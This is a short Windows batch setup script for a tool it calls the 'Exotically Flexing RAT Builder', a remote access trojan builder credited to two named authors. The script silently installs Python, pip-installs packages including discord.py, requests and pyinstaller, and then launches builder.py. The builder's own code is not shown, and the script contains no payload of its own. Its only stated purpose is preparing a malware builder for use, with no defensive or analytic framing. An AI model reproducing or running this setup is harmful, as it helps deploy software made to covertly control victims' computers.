@echo off
title Exotically Flexing RAT Builder Setup
color 0a

echo ===================================================
echo Exotically Flexing RAT Builder - Setup Script
echo Created by: dead exotic and hoa
echo ===================================================
echo.

:: Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python not found. Installing Python 3.12...
    echo [*] Downloading Python 3.12 installer...
    curl -L -o python-3.12.0-amd64.exe https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe
    
    echo [*] Installing Python 3.12 (this may take a few minutes)...
    start /wait python-3.12.0-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    echo [+] Python 3.12 installed successfully!
    del python-3.12.0-amd64.exe
    
    :: Refresh environment variables to recognize Python
    setx PATH "%PATH%" >nul 2>&1
    set PATH=%PATH%
) else (
    echo [+] Python is already installed.
)

echo.
echo [*] Installing required modules...

:: Install required modules
python -m pip install --upgrade pip
python -m pip install discord.py pycaw comtypes requests pyinstaller colorama

echo.
echo [+] All requirements installed successfully!
echo.
echo [*] Starting Exotically Flexing RAT Builder...
echo.

:: Run the main script
python builder.py

echo.
echo [*] Exiting...
pause >nul
exit /b 0
